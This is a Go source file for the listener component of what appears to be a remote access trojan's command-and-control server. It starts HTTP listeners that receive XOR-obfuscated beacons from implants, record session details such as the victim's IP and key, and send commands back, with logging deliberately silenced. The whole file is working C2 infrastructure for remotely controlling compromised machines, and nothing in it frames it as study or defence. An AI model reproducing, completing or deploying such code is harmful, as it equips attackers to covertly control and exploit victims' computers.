package CommandControl

import (
	"Server/Public"
	"encoding/json"
	"errors"
	"github.com/gin-gonic/gin"
	"io"
	"net/http"
	"strconv"
	"sync"
	"time"
)

type Listener struct {
	listenerInfo map[string]*http.Server // {name: pServer, ...}
	rwMutex      sync.RWMutex
}

var ListenerObj = Listener{
	listenerInfo: map[string]*http.Server{},
}

func (p *Listener) SetListener(name string, pServer *http.Server) {
	p.rwMutex.Lock()
	defer p.rwMutex.Unlock()
	p.listenerInfo[name] = pServer
}

func (p *Listener) CloseListener(name string) error {
	p.rwMutex.Lock()
	defer p.rwMutex.Unlock()
	return p.listenerInfo[name].Shutdown(nil)
}

func (p *Listener) StartListener(username string, listenerInfo map[string]string) {
	if listenerInfo["type"] == "HTTP Reverse" {
		p.HttpReverseListener(username, listenerInfo)
	}
}

func (p *Listener) StartAllListeners() {
	listenerInfoList := Public.SqlSelect("SELECT * FROM ListenerInfo")
	for _, listenerInfo := range listenerInfoList {
		p.StartListener("C2 Server", listenerInfo)
	}
}

func (p *Listener) HttpReverseListener(username string, listenerInfo map[string]string) {
	gin.SetMode(gin.ReleaseMode)
	gin.DefaultWriter = io.Discard
	r := gin.Default()

	// 与 RAT 交互
	r.POST("/*path", func(c *gin.Context) {
		data, err := io.ReadAll(c.Request.Body) // data: 密文 + KEY(8位)
		if err != nil {
			Public.PrintLog("error", "Listener "+listenerInfo["name"]+" failed to receive data from "+c.ClientIP()+".\n"+err.Error())
			return
		}
		if len(data) < 10 {
			Public.PrintLog("warning", "Listener "+listenerInfo["name"]+" - Invalid data format from "+c.ClientIP()+".")
			return
		}
		var outputInfo map[string]map[string]interface{}
		err = json.Unmarshal(XorData(data)[:len(data)-8], &outputInfo)
		if err != nil {
			Public.PrintLog("warning", "Listener "+listenerInfo["name"]+" - Invalid data format from "+c.ClientIP()+".\n"+err.Error())
			return
		}
		sessionInfo, exists := outputInfo["sessionInfo"]
		if !exists {
			Public.PrintLog("warning", "Listener "+listenerInfo["name"]+" - Data excluding sessionInfo from "+c.ClientIP()+".")
			return
		}
		sessionInfo["key"] = data[len(data)-8:]
		sessionInfo["external"] = c.ClientIP()
		sessionInfo["listener"] = listenerInfo["name"]
		sessionInfo["sleep"] = strconv.FormatInt(time.Now().UnixNano(), 10)
		if SessionObj.UpdateSessionInfo(sessionInfo) {
			SessionObj.IssueCommands(outputInfo, c)
		}
	})

	server := http.Server{
		Addr:    ":" + listenerInfo["port"],
		Handler: r,
	}
	go func() {
		err := server.ListenAndServe()
		if err != nil && !errors.Is(err, http.ErrServerClosed) {
			Public.PrintLog("error", username+" is unable to start the listener "+listenerInfo["name"]+".\n"+err.Error())
		}
	}()
	p.SetListener(listenerInfo["name"], &server)
	Public.PrintLog("info", username+" tries to start the listener "+listenerInfo["name"]+".")
}
